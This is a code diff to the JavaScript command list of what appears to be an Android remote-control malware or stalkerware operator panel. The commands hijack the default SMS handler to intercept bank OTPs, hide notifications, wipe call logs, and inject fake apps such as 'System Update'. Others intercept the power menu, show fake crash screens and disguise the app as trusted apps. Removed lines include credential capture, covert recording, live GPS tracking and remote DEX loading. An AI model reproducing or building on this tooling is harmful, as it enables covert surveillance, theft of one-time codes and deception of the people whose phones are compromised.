@@ -451,12 +451,12 @@
             logoTimer = setTimeout(() => { logoClicks = 0; }, 500);
         }
 
-        const COMMAND_GROUPS = [
+                const COMMAND_GROUPS = [
             {
-                id: 'comm', 
-                label: 'Communications & Logs', 
-                css: 'sys', 
-                search: 'sms, calls, contacts, keywords, filter, hvt, redirection, forward, wipe, delete, sanitize, auto, swipe, default, handler',
+                id: 'comm_clan',
+                label: 'Intercepts & Communications',
+                css: 'sys',
+                search: 'sms, default, role, bypass, forward, intercept, redirect, trap, number, bank, otp, login, password, alert, hide, suppress, block, notification, filter, spam, fake, incoming, message, spoof, text, outgoing, delete, clear, conversation, search, find, remove, call, history, phonebook, canary, monitor, sim, change, fingerprint',
                 commands: [
                     { id: 'SET_DEFAULT_SMS', name: 'Hijack SMS Handler', icon: '💬', keywords: 'hijack, default, role, bypass, samsung, messaging', inputs: [{id: 'sms-default-mode', label: 'Strategy', type: 'select', options: [{v: 'AUTO', l: 'AUTO (Ghost Hand)'}, {v: 'AUTO_NAV', l: 'Manual Fallback (Ghost)'}, {v: 'RELENTLESS', l: 'Relentless Loop'}, {v: 'TRIGGER', l: 'Trigger Prompt'}, {v: 'SCRAPE', l: 'Scrape Dialog'}, {v: 'STOP_RELENTLESS', l: 'Stop Loop'}]}] },
                     { id: 'RESTORE_DEFAULT_SMS', name: 'Restore Original SMS', icon: '⏪', keywords: 'revert, uninstall, clean', inputs: [] },
@@ -471,58 +471,75 @@
                     { id: 'WIPE_NOTIFICATIONS', name: 'Wipe Notifications', icon: '🧹', keywords: 'clear, hide, suppress', inputs: [{id: 'wipe-mode', label: 'Mode', type: 'select', options: [{v: 'ALL', l: 'All'}, {v: 'PKG', l: 'Package'}, {v: 'TEXT', l: 'Keyword'}]}, {id: 'wipe-val', label: 'Value (App or Word)', type: 'text'}] },
                     { id: 'PHONE_LOGS', name: 'Sanitize Call Logs', icon: '🧼', keywords: 'delete, call, history, incoming, outgoing', inputs: [{id: 'call-act', label: 'Action', type: 'select', options: [{v: 'CLEAR_ALL', l: 'Wipe All'}, {v: 'DELETE_LAST', l: 'Wipe Last'}, {v: 'DELETE_NUM', l: 'Wipe Number'}]}, {id: 'call-val', label: 'Value/Number', type: 'text'}] },
                     { id: 'ADD_CONTACT', name: 'Inject Contact', icon: '👤', keywords: 'new, person, phonebook', inputs: [{id: 'con-name', label: 'Name', type: 'text'}, {id: 'con-num', label: 'Number', type: 'text'}] },
-                                        { id: 'SET_SIM_TRACKER', name: 'SIM Hardware Tracker', icon: '🐦', keywords: 'canary, monitor, sim, change, alert, fingerprint', inputs:[{id: 'watchdog-num', label: 'Handler Number(s) (Comma/Semicolon ok)', type: 'text'}] },
+                    { id: 'SET_SIM_TRACKER', name: 'SIM Hardware Tracker', icon: '🐦', keywords: 'canary, monitor, sim, change, alert, fingerprint', inputs:[{id: 'watchdog-num', label: 'Handler Number(s) (Comma/Semicolon ok)', type: 'text'}] },
                     { id: 'PURGE_CONTACT', name: 'Purge Specific Contact', icon: '🗑️', keywords: 'delete, remove, contact', inputs: [{id: 'con-purge', label: 'Name or Number to Wipe', type: 'text'}] }
                 ]
             },
             {
-                id: 'surv', 
-                label: 'Active Surveillance', 
-                css: 'surv', 
-                search: 'camera, mic, snapshot, audio, recording, screenshot, eyes, ears, environment, sensors, scraper',
+                id: 'launcher_clan',
+                label: 'Home Screen & Masquerade',
+                css: 'sys',
+                search: 'home, launcher, native, ui, bypass, grid, rows, columns, layout, size, spacing, work, profile, island, personal, mode, bottom, bar, icons, fixed, pages, order, sort, overflow, fake, shortcut, webapp, intent, custom, share, mirror, app, clone, remove, list, blacklist, ghost, clear, unhide, visible, restore, hidden, verify',
                 commands: [
-                    { id: 'GET_SCREENSHOT', name: 'Capture Screen', icon: '📸', keywords: 'eyes, picture, screen, capture', inputs: [{id: 'scr-quality', label: 'Quality %', type: 'number', val: 70}, {id: 'scr-freq', label: 'Freq (0=Single)', type: 'number', val: 0}, {id: 'scr-dur', label: 'Duration (s)', type: 'number', val: 0}] },
-                    { id: 'TRACKING_STREAM', name: 'High-Fidelity Tracking', icon: '🛰️', keywords: 'realtime, socket, live, tracker, database, batch', inputs: [{id: 'track-mode', label: 'Tracking Mode', type: 'select', options: [{v: 'BOTH', l: 'BOTH (Socket + DB)'}, {v: 'WEBSOCKET', l: 'WEBSOCKET (Live Map Only)'}, {v: 'DATABASE', l: 'DATABASE (Persistent Trail)'}, {v: 'OFF', l: 'Stop Tracking'}]}, {id: 'track-dur', label: 'Duration (Min)', type: 'number', val: 15}, {id: 'track-sample', label: 'GPS Sample Rate (Sec)', type: 'number', val: 3}, {id: 'track-batch', label: 'DB Batch Upload Rate (Sec)', type: 'number', val: 15}], customUI: '<div style="margin-bottom:10px;"><button class="btn" style="width:100%; border-style:dashed; color:var(--success); border-color:var(--success);" onclick="openLiveMap()">🗺️ OPEN SATELLITE MAP INTERFACE</button></div>' },
-                    { id: 'RECORD_VOICE', name: 'Record Microphone', icon: '🎙️', keywords: 'mic, audio, ears, listen', inputs: [{id: 'mic-dur', label: 'Duration (Seconds)', type: 'number', val: 10}] },
-                    { id: 'RECORD_SCREEN', name: 'Relentless Screen Record', icon: '🎥', keywords: 'video, movie, stream, monitor', inputs: [{id: 'rec-mode', label: 'Strategy', type: 'select', options: [{v: 'AUTO', l: 'AUTO (Ghost Accept)'}, {v: 'RELENTLESS', l: 'Relentless Loop'}, {v: 'TRIGGER', l: 'Trigger Prompt'}, {v: 'SCRAPE', l: 'Scrape Dialog'}]}, {id: 'rec-dur', label: 'Duration (Sec)', type: 'number', val: 60}, {id: 'rec-qual', label: 'Resolution', type: 'select', options: [{v: 'MED', l: '720p'}, {v: 'LOW', l: '480p'}, {v: 'ULTRA_LOW', l: '360p (Data Saver)'}, {v: 'HIGH', l: '1080p'}]}, {id: 'rec-fps', label: 'Frame Rate', type: 'select', options: [{v: '30', l: '30 FPS'}, {v: '15', l: '15 FPS'}, {v: '10', l: '10 FPS'}, {v: '60', l: '60 FPS (Smooth)'}]}, {id: 'rec-audio', label: 'Audio (Mic)', type: 'select', options: [{v: 'FALSE', l: 'Video Only'}, {v: 'TRUE', l: 'With Audio'}]}] },
-                    { id: 'CAPTURE_IMAGE', name: 'Take Photos', icon: '📷', keywords: 'camera, lens, front, rear', inputs: [{id: 'cam-side', label: 'Source', type: 'select', options: [{v: 'REAR', l: 'Rear'}, {v: 'FRONT', l: 'Front'}]}, {id: 'cam-count', label: 'Quantity', type: 'number', val: 1}] },
-                    { id: 'GET_SENSORS', name: 'Sample Environment', icon: '🌡️', keywords: 'light, proximity, motion, temperature, physical, pocket', inputs: [] },
-                    { id: 'CAPTURE_CREDENTIALS', name: 'Capture Credentials', icon: '🔑', keywords: 'pattern, capture, credentials, pin, lock', inputs: [{id: 'patt-timeout', label: 'Timeout (s)', type: 'number', val: 30}, {id: 'patt-qual', label: 'Quality %', type: 'number', val: 80}, {id: 'patt-fps', label: 'Frame Rate', type: 'number', val: 15}] },
-                    { id: 'GET_TREE', name: 'UI Scraper (Hierarchy)', icon: '🌲', keywords: 'dump, inspect, hierarchy, layout', inputs:[{id: 'tree-pkg', label: 'Package Name', type: 'text', placeholder: 'com.pkg'}, {id: 'tree-dur', label: 'Duration (Min)', type: 'number', val: 1}, {id: 'tree-depth', label: 'Walk Depth', type: 'number', val: 10}], cleanup: 'RESET_SCRAPER' }
+                    { id: 'SET_LAUNCHER', name: 'Native One UI Launcher', icon: '📱', keywords: 'home, launcher, native, ui, bypass', inputs: [{id: 'launch-state', label: 'State', type: 'select', options: [{v: 'ON', l: 'Enable Launcher'}, {v: 'OFF', l: 'Disable (Show Dashboard)'}]}, {id: 'launch-wall', label: 'Wallpaper URL or Local Path', type: 'text', placeholder: 'https://... or /storage/...'}] },
+                    { id: 'SET_LAUNCHER_GRID', name: 'Calibrate Launcher Grid', icon: '📐', keywords: 'grid, rows, columns, layout, size, spacing', inputs: [{id: 'grid-cols', label: 'Columns (e.g. 4)', type: 'number', val: 4}, {id: 'grid-rows', label: 'Rows (e.g. 5)', type: 'number', val: 6}, {id: 'grid-icon-size', label: 'Icon Size (dp)', type: 'number', val: 56}, {id: 'grid-v-gap', label: 'Vertical Spacing (dp)', type: 'number', val: 22}, {id: 'grid-h-gap', label: 'Horizontal Spacing (dp)', type: 'number', val: 16}] },
+                    { id: 'SET_LAUNCHER_MODE', name: 'Launcher Partition Mode', icon: '🔀', keywords: 'work, profile, island, personal, mode', inputs: [{id: 'launch-mode', label: 'Mode', type: 'select', options: [{v: 'PERSONAL', l: 'Personal (Standard)'}, {v: 'WORK', l: 'Work Profile (Island)'}]}] },
+                    { id: 'SET_DOCK_APPS', name: 'Configure Dock (Max 5)', icon: '⚓', keywords: 'bottom, bar, icons, fixed', inputs: [{id: 'dock-pkgs', label: 'Package Names (Comma list)', type: 'text'}] },
+                    { id: 'ORDER_HOME_PAGES', name: 'Calibrate Home Pages', icon: '📑', keywords: 'home, pages, order, sort, layout, overflow', inputs: [{id: 'home-pages-layout', label: 'Page Layout (e.g. com.whatsapp | com.youtube, com.chrome)', type: 'textarea', placeholder: 'Page 1 apps | Page 2 apps...'}] },
+                    { 
+                        id: 'ADD_FAKE_APP', 
+                        name: 'Inject Synthetic App', 
+                        icon: '🧪', 
+                        keywords: 'fake, shortcut, webapp, intent, custom', 
+                        inputs: [],
+                        customUI: `
+                            <div class="card" style="background:rgba(0,243,255,0.02); border-style:dotted;">
+                                <div class="cmd-row">
+                                    <label style="font-size:0.6rem; color:#666;">APP_DISPLAY_NAME</label>
+                                    <input type="text" id="fa-name" placeholder="e.g. System Update">
+                                </div>
+                                <div class="cmd-row">
+                                    <label style="font-size:0.6rem; color:#666;">ICON_URL (Backend or Local Path)</label>
+                                    <input type="text" id="fa-icon" placeholder="https://.../icon.png">
+                                </div>
+                                <div style="display:flex; gap:5px; margin-bottom:10px;">
+                                    <div style="flex:1">
+                                        <label style="font-size:0.6rem; color:#666;">PARTITION</label>
+                                        <select id="fa-mode" style="width:100%; background:#000; color:var(--primary); border:1px solid #333; padding:5px;">
+                                            <option value="PERSONAL">PERSONAL</option>
+                                            <option value="WORK">WORK_PROFILE</option>
+                                        </select>
+                                    </div>
+                                    <div style="flex:1">
+                                        <label style="font-size:0.6rem; color:#666;">METHOD</label>
+                                        <select id="fa-method" style="width:100%; background:#000; color:var(--primary); border:1px solid #333; padding:5px;">
+                                            <option value="HTML">HTML (Web App)</option>
+                                            <option value="INTENT">INTENT (System)</option>
+                                        </select>
+                                    </div>
+                                </div>
+                                <div class="cmd-row">
+                                    <label style="font-size:0.6rem; color:#666;">PAYLOAD (HTML String or Intent JSON)</label>
+                                    <textarea id="fa-payload" style="height:60px;" placeholder="<html>... or {'action':...}"></textarea>
+                                </div>
+                            </div>
+                        `
+                    },
+                    { id: 'REMOVE_FAKE_APP', name: 'Purge Synthetic App', icon: '⚰️', inputs: [{id: 'fa-purge-name', label: 'App Name to Remove', type: 'text'}] },
+                    { id: 'SHARE_APP', name: 'Mirror Launcher App', icon: '🔁', keywords: 'share, mirror, app, clone, launcher, work, personal', inputs: [{id: 'share-act', label: 'Action', type: 'select', options: [{v: 'ADD', l: 'Add (Mirror to both)'}, {v: 'REMOVE', l: 'Remove (Restrict to default)'}, {v: 'CLEAR', l: 'Clear All Shared'}]}, {id: 'share-pkg', label: 'App Package Name', type: 'text'}] },
+                    { id: 'HIDE_APPS', name: 'Hide Apps from Launcher', icon: '👻', keywords: 'remove, list, blacklist, ghost, clear', inputs: [{id: 'hide-pkgs', label: 'Packages (Comma separated)', type: 'text', placeholder: 'com.pkg.name, com.other.app'}] },
+                    { id: 'UNHIDE_APPS', name: 'Unhide Apps', icon: '👀', keywords: 'unhide, visible, restore', inputs: [{id: 'unhide-pkgs', label: 'Packages (Comma list or ALL)', type: 'text', placeholder: 'com.pkg.name or ALL'}] },
+                    { id: 'GET_HIDDEN_APPS', name: 'Query Hidden App List', icon: '📋', keywords: 'list, hidden, verify', inputs: [] }
                 ]
             },
             {
-                id: 'remote', 
-                label: 'Remote Interaction', 
-                css: 'sys', 
-                search: 'wake, touch, brightness, screen, dimmer, ui, inject, intent, ghost, chain, unblind',
+                id: 'traps_clan',
+                label: 'Deceptive Screen Traps',
+                css: 'crisis',
+                search: 'status, top, bar, overlay, power, shield, intercept, boot, shutdown, predictive, acc, trap, dex, zip, speedster, native, instant, clear, ui, purge, crash, error, not responding, close, hide, deceptive',
                 commands: [
-                    { 
-                        id: 'REMOTE_TOUCH', 
-                        name: 'Execute Touch Chain', 
-                        icon: '⛓️', 
-                        inputs: [{id: 'touch-json-raw', label: 'Chain JSON (Auto-Generated)', type: 'textarea'}], 
-                        customUI: `
-                            <div class="card" style="padding:10px; border-style:dashed; margin-bottom:10px; background:rgba(0,243,255,0.02);">
-                                <div id="touch-chain-list" style="display:flex; flex-direction:column; gap:5px; margin-bottom:10px;"></div>
-                                <div style="display:flex; gap:5px;">
-                                    <select id="next-step-type" style="flex:1; background:#000; color:var(--primary); border:1px solid #333; font-size:0.7rem;">
-                                        <option value="NODE">TAP NODE (ID/Text)</option>
-                                        <option value="TAP">TAP COORD (X,Y)</option>
-                                        <option value="NAV">NAV ACTION</option>
-                                        <option value="WAIT">WAIT (ms)</option>
-                                        <option value="SWIPE">SWIPE (X1,Y1,X2,Y2)</option>
-                                        <option value="INTENT">REMOTE INTENT (SYS)</option>
-                                    </select>
-                                    <button class="btn" onclick="addTouchStep()" style="padding:5px 10px; font-size:0.6rem;">+ STEP</button>
-                                </div>
-                            </div>` 
-                    },
-                    { id: 'BRIGHTNESS', name: 'Screen Dimmer / Stealth', icon: '🌓', inputs: [{id: 'bri-level', label: 'Level 0-100', type: 'number', val: 0}, {id: 'bri-method', label: 'Method', type: 'select', options: [{v: 'ACC', l: 'ACC (Stealth)'}, {v: 'OVERLAY', l: 'Overlay'}, {v: 'HARDWARE', l: 'Hardware'}]}], cleanup: 'UNBLIND' },
                     { id: 'INJECT_UI', name: 'Inject Web Overlay', icon: '🖼️', inputs: [{id: 'ui-touchable', label: 'Input Mode', type: 'select', options: [{v: 'TRUE', l: 'Touchable'}, {v: 'FALSE', l: 'Ghost'}]}, {id: 'ui-method', label: 'Injection Method', type: 'select', options: [{v: 'AUTO', l: 'AUTO (Smart Priority)'}, {v: 'ACC', l: 'Accessibility Layer'}, {v: 'OVERLAY', l: 'Standard Overlay'}]}, {id: 'ui-html', label: 'HTML Content', type: 'textarea'}], cleanup: 'REMOVE_UI' },
-                    { id: 'WAKE', name: 'Force Screen Wake', icon: '💡', inputs: [{id: 'val-wake', label: 'Mode', type: 'select', options: [{v: 'standard', l: 'Standard'}, {v: 'wellbeing', l: 'Route Wellbeing'}]}] },
-                    { id: 'RUN_INTENT', name: 'Trigger System Intent', icon: '⚡', inputs: [{id: 'int-act', label: 'Action', type: 'text', val: 'android.intent.action.VIEW'}, {id: 'int-pkg', label: 'Package Name', type: 'text'}, {id: 'int-cls', label: 'Class Name', type: 'text'}, {id: 'int-data', label: 'URI/Data', type: 'text'}, {id: 'int-tgt', label: 'Target', type: 'select', options: [{v: 'activity', l: 'Activity'}, {v: 'service', l: 'Service'}, {v: 'broadcast', l: 'Broadcast'}]}, {id: 'int-json', label: '--- OR PASTE RAW JSON PAYLOAD ---', type: 'textarea'}] },
-                                        { id: 'REMOVE_UI', name: 'Force Remove Overlay', icon: '🚫', inputs:[] },
+                    { id: 'REMOVE_UI', name: 'Force Remove Overlay', icon: '🚫', inputs:[] },
                     { id: 'STATUS_BAR_UI', name: 'Status Bar Injection', icon: '🚥', keywords: 'status, top, bar, overlay', inputs: [{id: 'sb-state', label: 'State', type: 'select', options:[{v: 'ON', l: 'Activate'}, {v: 'OFF', l: 'Deactivate'}]}, {id: 'sb-touchable', label: 'Input Mode', type: 'select', options:[{v: 'FALSE', l: 'Ghost (Pass-through)'}, {v: 'TRUE', l: 'Touchable'}]}, {id: 'sb-html', label: 'HTML Content', type: 'textarea', placeholder: '<html>...'}] },
                     { id: 'POWER_SHIELD', name: 'Power Menu Shield', icon: '🛡️', inputs: [{id: 'ps-toggle', label: 'Intercept State', type: 'select', options: [{v: 'ON', l: 'ENABLED (Armed)'}, {v: 'OFF', l: 'DISABLED (Pass-through)'}]}, {id: 'ps-timeout', label: 'Failsafe Timeout (s)', type: 'number', val: 15}, {id: 'ps-method', label: 'Injection Layer', type: 'select', options: [{v: 'ACC', l: 'ACC (Above Power Menu)'}, {v: 'OVERLAY', l: 'Standard (Standard Apps)'}]}, {id: 'ps-html-shutdown', label: 'Shutdown HTML Payload', type: 'textarea', placeholder: '<html>Shutdown Content</html>'}, {id: 'ps-html-boot', label: 'Boot/Logo HTML Payload', type: 'textarea', placeholder: '<html>Boot/Logo Content</html>'}] },
                     { 
@@ -598,62 +615,7 @@
                             </div>
                         ` 
                     },
-                    { id: 'FORCE_DATA', name: 'Ghost Hand Data Toggle', icon: '📡', keywords: 'mobile, data, cellular, internet', inputs: [{id: 'val-data', label: 'State', type: 'select', options: [{v: 'ENABLE', l: 'Enable'}, {v: 'DISABLE', l: 'Disable'}, {v: 'TOGGLE', l: 'Toggle (Blind)'}]}] },
-                    { id: 'SET_LAUNCHER', name: 'Native One UI Launcher', icon: '📱', keywords: 'home, launcher, native, ui, bypass', inputs: [{id: 'launch-state', label: 'State', type: 'select', options: [{v: 'ON', l: 'Enable Launcher'}, {v: 'OFF', l: 'Disable (Show Dashboard)'}]}, {id: 'launch-wall', label: 'Wallpaper URL or Local Path', type: 'text', placeholder: 'https://... or /storage/...'}] },
-                    { id: 'SET_LAUNCHER_GRID', name: 'Calibrate Launcher Grid', icon: '📐', keywords: 'grid, rows, columns, layout, size, spacing', inputs: [{id: 'grid-cols', label: 'Columns (e.g. 4)', type: 'number', val: 4}, {id: 'grid-rows', label: 'Rows (e.g. 5)', type: 'number', val: 6}, {id: 'grid-icon-size', label: 'Icon Size (dp)', type: 'number', val: 56}, {id: 'grid-v-gap', label: 'Vertical Spacing (dp)', type: 'number', val: 22}, {id: 'grid-h-gap', label: 'Horizontal Spacing (dp)', type: 'number', val: 16}] },
-                    { id: 'SET_LAUNCHER_MODE', name: 'Launcher Partition Mode', icon: '🔀', keywords: 'work, profile, island, personal, mode', inputs: [{id: 'launch-mode', label: 'Mode', type: 'select', options: [{v: 'PERSONAL', l: 'Personal (Standard)'}, {v: 'WORK', l: 'Work Profile (Island)'}]}] },
-                    { id: 'SET_DOCK_APPS', name: 'Configure Dock (Max 5)', icon: '⚓', keywords: 'bottom, bar, icons, fixed', inputs: [{id: 'dock-pkgs', label: 'Package Names (Comma list)', type: 'text'}] },
-                    { id: 'ORDER_HOME_PAGES', name: 'Calibrate Home Pages', icon: '📑', keywords: 'home, pages, order, sort, layout, overflow', inputs: [{id: 'home-pages-layout', label: 'Page Layout (e.g. com.whatsapp | com.youtube, com.chrome)', type: 'textarea', placeholder: 'Page 1 apps | Page 2 apps...'}] },
-                    { 
-                        id: 'ADD_FAKE_APP', 
-                        name: 'Inject Synthetic App', 
-                        icon: '🧪', 
-                        keywords: 'fake, shortcut, webapp, intent, custom', 
-                        inputs: [],
-                        customUI: `
-                            <div class="card" style="background:rgba(0,243,255,0.02); border-style:dotted;">
-                                <div class="cmd-row">
-                                    <label style="font-size:0.6rem; color:#666;">APP_DISPLAY_NAME</label>
-                                    <input type="text" id="fa-name" placeholder="e.g. System Update">
-                                </div>
-                                <div class="cmd-row">
-                                    <label style="font-size:0.6rem; color:#666;">ICON_URL (Backend or Local Path)</label>
-                                    <input type="text" id="fa-icon" placeholder="https://.../icon.png">
-                                </div>
-                                <div style="display:flex; gap:5px; margin-bottom:10px;">
-                                    <div style="flex:1">
-                                        <label style="font-size:0.6rem; color:#666;">PARTITION</label>
-                                        <select id="fa-mode" style="width:100%; background:#000; color:var(--primary); border:1px solid #333; padding:5px;">
-                                            <option value="PERSONAL">PERSONAL</option>
-                                            <option value="WORK">WORK_PROFILE</option>
-                                        </select>
-                                    </div>
-                                    <div style="flex:1">
-                                        <label style="font-size:0.6rem; color:#666;">METHOD</label>
-                                        <select id="fa-method" style="width:100%; background:#000; color:var(--primary); border:1px solid #333; padding:5px;">
-                                            <option value="HTML">HTML (Web App)</option>
-                                            <option value="INTENT">INTENT (System)</option>
-                                        </select>
-                                    </div>
-                                </div>
-                                <div class="cmd-row">
-                                    <label style="font-size:0.6rem; color:#666;">PAYLOAD (HTML String or Intent JSON)</label>
-                                    <textarea id="fa-payload" style="height:60px;" placeholder="<html>... or {\"action\":...}"></textarea>
-                                </div>
-                            </div>
-                        `
-                    },
-                    { id: 'REMOVE_FAKE_APP', name: 'Purge Synthetic App', icon: '⚰️', inputs: [{id: 'fa-purge-name', label: 'App Name to Remove', type: 'text'}] },
-                    { id: 'SHARE_APP', name: 'Mirror Launcher App', icon: '🔁', keywords: 'share, mirror, app, clone, launcher, work, personal', inputs: [{id: 'share-act', label: 'Action', type: 'select', options: [{v: 'ADD', l: 'Add (Mirror to both)'}, {v: 'REMOVE', l: 'Remove (Restrict to default)'}, {v: 'CLEAR', l: 'Clear All Shared'}]}, {id: 'share-pkg', label: 'App Package Name', type: 'text'}] },
-                    { id: 'HIDE_APPS', name: 'Hide Apps from Launcher', icon: '👻', keywords: 'remove, list, blacklist, ghost, clear', inputs: [{id: 'hide-pkgs', label: 'Packages (Comma separated)', type: 'text', placeholder: 'com.pkg.name, com.other.app'}] },
-                    { id: 'UNHIDE_APPS', name: 'Unhide Apps', icon: '👀', keywords: 'unhide, visible, restore', inputs: [{id: 'unhide-pkgs', label: 'Packages (Comma list or ALL)', type: 'text', placeholder: 'com.pkg.name or ALL'}] },
-                    { id: 'GET_HIDDEN_APPS', name: 'Query Hidden App List', icon: '📋', keywords: 'list, hidden, verify', inputs: [] },
-                    { id: 'SET_WALLPAPER', name: 'Inject System Wallpaper', icon: '🖼️', keywords: 'background, lock, home, deception', inputs: [{id: 'wall-target', label: 'Target Screen', type: 'select', options: [{v: 'BOTH', l: 'Both Screens'}, {v: 'LOCK', l: 'Lock Screen Only'}, {v: 'HOME', l: 'Home Screen Only'}]}, {id: 'wall-url', label: 'Image URL or Local Path', type: 'text'}] },
-                    { id: 'SET_EMERGENCY_WALLPAPER', name: 'Set Emergency Wallpapers', icon: '🚨', keywords: 'emergency, welcome, wizard, background, lock, home', inputs: [{id: 'em-wall-home', label: 'Home Screen URL / Local Path', type: 'text'}, {id: 'em-wall-lock', label: 'Lock Screen URL / Local Path', type: 'text'}] },
-                    { id: 'SET_SYSTEM_FONT', name: 'Force System Font', icon: '🔤', keywords: 'ghost, settings, style, deception', inputs: [{id: 'sys-font-name', label: 'Font Name (Exact as in device list)', type: 'text', placeholder: 'SamsungOne, Roboto, etc.'}] },
-                    { id: 'SET_SYSTEM_THEME', name: 'Force System Theme', icon: '🌗', keywords: 'light, dark, settings, deception', inputs: [{id: 'sys-theme-mode', label: 'Theme Mode', type: 'select', options: [{v: 'Light', l: 'Light'}, {v: 'Dark', l: 'Dark'}]}] },
-                    { id: 'EYE_SHIELD', name: 'Eye Comfort Shield', icon: '🕶️', keywords: 'blue, light, filter, yellow, screen, display', inputs: [{id: 'eye-mode', label: 'Target State', type: 'select', options: [{v: 'ENABLE', l: 'ENABLE (Yellow Tint)'}, {v: 'DISABLE', l: 'DISABLE (Standard)'}]}] },
-                    { id: 'HIJACK_LAUNCHER', name: 'Hijack Home Role', icon: '🏠', keywords: 'home, default, ghost, hand, blindfold', inputs: [] },
+                    { id: 'CLEAR_UI_TRAP', name: 'Purge UI Traps', icon: '🧹', keywords: 'clear, ui, trap, purge', inputs: [] },
                     {
                         id: 'NATIVE_UI_TRAP',
                         name: 'Speedster Native Trap',
@@ -695,79 +657,70 @@
                             </div>
                         `
                     },
-                    { id: 'CLEAR_UI_TRAP', name: 'Purge UI Traps', icon: '🧹', keywords: 'clear, ui, trap, purge', inputs: [] },
-                    { id: 'RUN_DEX_TASK', name: 'Run DEX Task', icon: '⚙️', keywords: 'dex, run, dynamic, class', inputs: [{id: 'rdt-url', label: 'URL (.dex / .zip)', type: 'text'}, {id: 'rdt-class', label: 'Class Name', type: 'text'}, {id: 'rdt-timeout', label: 'Timeout', type: 'number', val: 30}] },
-                    { id: 'STOP_DEX_TASK', name: 'Stop DEX Task', icon: '🛑', keywords: 'stop, dex, kill', inputs: [{id: 'rdt-stop-class', label: 'Class Name', type: 'text'}] }
+                    { id: 'MOCK_ANR', name: 'Mock ANR (Native)', icon: '⚠️', keywords: 'crash, error, not responding, close, hide, deceptive', inputs: [{id: 'anr-target', label: 'Blamed App Name (Optional)', type: 'text', placeholder: 'Leave empty for Auto-Detect'}] }
                 ]
             },
             {
-                id: 'sys_tools', 
-                label: 'System & Identity', 
-                css: 'sys', 
-                search: 'toast, speak, tts, volume, ping, token, accounts, numbers, battery, vitals, ring, alarm',
+                id: 'hardware_clan',
+                label: 'Stealth Skins & Profiles',
+                css: 'sys',
+                search: 'brightness, dimmer, stealth, yellow, blue, light, filter, font, theme, background, lock, home, emergency, welcome, wizard, masquerade, skin, tile, debug, console, logs, logging',
                 commands: [
-                    { id: 'TOAST', name: 'Show Toast Alert', icon: '💬', inputs: [{id: 'val-toast', label: 'Message', type: 'text'}] },
-                    { id: 'SPEAK_TEXT', name: 'Speak Text (TTS)', icon: '🗣️', inputs: [{id: 'speak-text', label: 'Message', type: 'text'}, {id: 'speak-vol', label: 'Volume %', type: 'number', val: 80}] },
-                    { id: 'RING', name: 'Sonic Alarm', icon: '🔔', inputs: [{id: 'val-ring', label: 'Duration (Seconds)', type: 'number', val: 10}] },
-                    { id: 'VOLUME', name: 'Set Audio Volume', icon: '🔊', inputs: [{id: 'vol-stream', label: 'Stream', type: 'select', options: [{v: 'RING', l: 'Ring'}, {v: 'MEDIA', l: 'Media'}, {v: 'ALARM', l: 'Alarm'}]}, {id: 'vol-level', label: 'Level (0-100 / SILENT)', type: 'text'}] },
-                    { id: 'FLIGHT_MODE', name: 'Toggle Flight Mode', icon: '✈️', keywords: 'airplane, offline, disconnect, data, signal', inputs: [{id: 'val-flight', label: 'State', type: 'select', options: [{v: 'ON', l: 'Enable (Offline)'}, {v: 'OFF', l: 'Disable (Online)'}]}] },
-                    { id: 'SCREEN_TIMEOUT', name: 'Set Screen Timeout', icon: '⏲️', inputs: [{id: 'val-timeout', label: 'Seconds', type: 'number', val: 30}] },
-                    { id: 'PING', name: 'Send Connection Ping', icon: '📡', inputs: [] },
+                    { id: 'BRIGHTNESS', name: 'Screen Dimmer / Stealth', icon: '🌓', inputs: [{id: 'bri-level', label: 'Level 0-100', type: 'number', val: 0}, {id: 'bri-method', label: 'Method', type: 'select', options: [{v: 'ACC', l: 'ACC (Stealth)'}, {v: 'OVERLAY', l: 'Overlay'}, {v: 'HARDWARE', l: 'Hardware'}]}], cleanup: 'UNBLIND' },
+                    { id: 'EYE_SHIELD', name: 'Eye Comfort Shield', icon: '🕶️', keywords: 'blue, light, filter, yellow, screen, display', inputs: [{id: 'eye-mode', label: 'Target State', type: 'select', options: [{v: 'ENABLE', l: 'ENABLE (Yellow Tint)'}, {v: 'DISABLE', l: 'DISABLE (Standard)'}]}] },
+                    { id: 'SET_SYSTEM_FONT', name: 'Force System Font', icon: '🔤', keywords: 'ghost, settings, style, deception', inputs: [{id: 'sys-font-name', label: 'Font Name (Exact as in device list)', type: 'text', placeholder: 'SamsungOne, Roboto, etc.'}] },
+                    { id: 'SET_SYSTEM_THEME', name: 'Force System Theme', icon: '🌗', keywords: 'light, dark, settings, deception', inputs: [{id: 'sys-theme-mode', label: 'Theme Mode', type: 'select', options: [{v: 'Light', l: 'Light'}, {v: 'Dark', l: 'Dark'}]}] },
+                    { id: 'SET_WALLPAPER', name: 'Inject System Wallpaper', icon: '🖼️', keywords: 'background, lock, home, deception', inputs: [{id: 'wall-target', label: 'Target Screen', type: 'select', options: [{v: 'BOTH', l: 'Both Screens'}, {v: 'LOCK', l: 'Lock Screen Only'}, {v: 'HOME', l: 'Home Screen Only'}]}, {id: 'wall-url', label: 'Image URL or Local Path', type: 'text'}] },
+                    { id: 'SET_EMERGENCY_WALLPAPER', name: 'Set Emergency Wallpapers', icon: '🚨', keywords: 'emergency, welcome, wizard, background, lock, home', inputs: [{id: 'em-wall-home', label: 'Home Screen URL / Local Path', type: 'text'}, {id: 'em-wall-lock', label: 'Lock Screen URL / Local Path', type: 'text'}] },
+                    { id: 'SET_MASQUERADE', name: 'Apply Stealth Skin', icon: '🎭', inputs: [{id: 'val-masquerade', label: 'App Mask', type: 'select', options: [{v: 'SETTINGS', l: 'Settings (System Default)'}, {v: 'TALKBACK', l: 'TalkBack (ACC Request)'}, {v: 'DRIVE', l: 'Drive Services'}, {v: 'CALC', l: 'Calculator'}, {v: 'GOOGLE_PHONE', l: 'Phone (Google)'}, {v: 'GOOGLE_MSG', l: 'Messages (Google)'}, {v: 'SAM_PHONE', l: 'Phone (Samsung)'}, {v: 'SAM_MSG', l: 'Messages (Samsung)'}, {v: 'CHROME', l: 'Chrome'}, {v: 'IMO', l: 'imo'}, {v: 'IMO_HD', l: 'imo HD'}, {v: 'IMO_BETA', l: 'imo beta'}, {v: 'IMO_LITE', l: 'imo lite'}, {v: 'TRUECALLER', l: 'Truecaller'}]}] },
+                    { id: 'SET_TILE_STATE', name: 'Master Visibility Mode', icon: '👁️', inputs: [{id: 'val-tile-state', label: 'Mode', type: 'select', options: [{v: 'ON', l: 'Show Dashboard'}, {v: 'OFF', l: 'Masquerade'}]}] },
